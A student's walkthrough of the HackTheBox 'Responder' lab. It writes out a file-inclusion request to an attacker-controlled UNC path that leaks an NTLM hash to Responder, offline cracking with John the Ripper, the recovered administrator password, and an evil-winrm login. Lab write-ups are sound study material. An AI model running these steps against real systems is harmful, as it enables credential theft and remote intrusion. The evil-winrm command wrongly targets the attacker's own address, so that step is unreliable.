# Responder — HackTheBox Starting Point

**Difficulty:** Very Easy
**Tier:** 1
**Date:** April  2026


## Summary
Used Responder to capture an NTLM hash via a file
inclusion vulnerability in a web application, then
cracked the hash offline with John the Ripper.

## Enumeration
nmap -sV -sC -p- 10.129.130.249

**Results:**
- Port 80/tcp open — HTTP
- Port 5985/tcp open — WinRM (Windows Remote Management)

Navigated to the web application. The page was not loading, so I added the IP address and URL to etc/hosts.

sudo nano /etc/hosts

10.129.130.249    unika.htb

Noticed the URL included a page parameter loading local files.

http://10.129.130.249/?page=index.html

This pattern suggests possible Local File Inclusion (LFI).

## Exploitation
Tested the page parameter by pointing it to a remote
resource on my attack machine to see if the server
would make an outbound connection.

First started Responder on my VPN interface to
listen for incoming authentication attempts.

sudo responder -I tun0

added //10.10.15.221/somefile after the page= in the URL of the website and ran it 

The Windows server attempted to authenticate to my
machine — Responder captured the NTLMv2 hash.

Saved the hash to a file "hash.txt" and cracked it using
John the Ripper with the rockyou wordlist.

john hash.txt --wordlist=/usr/share/wordlists/
rockyou.txt hash.txt

Recovered the plaintext password. Used it to log
in via WinRM.

evil-winrm -i 10.10.15.221 -u administrator
-p badminton

Got remote access to the Windows machine, navigated through the directories and files using common commands cd .., ls, until I found the flag.txt file
in a directory called mike

## Flags
- Root flag: ea81b7afddd03efaa0945333ed147fac

## What I Learned
- How NTLM authentication works and why it
  can be abused over the network
- What Responder does and how hash capture attacks work
- Local File Inclusion leading to outbound
  authentication; a real-world attack chain
- Offline hash cracking with John the Ripper
  and the rockyou wordlist
- How to connect to Windows machines via WinRM
  using evil-winrm
- This machine introduced Windows exploitation;
  a big step up from Linux-focused machines
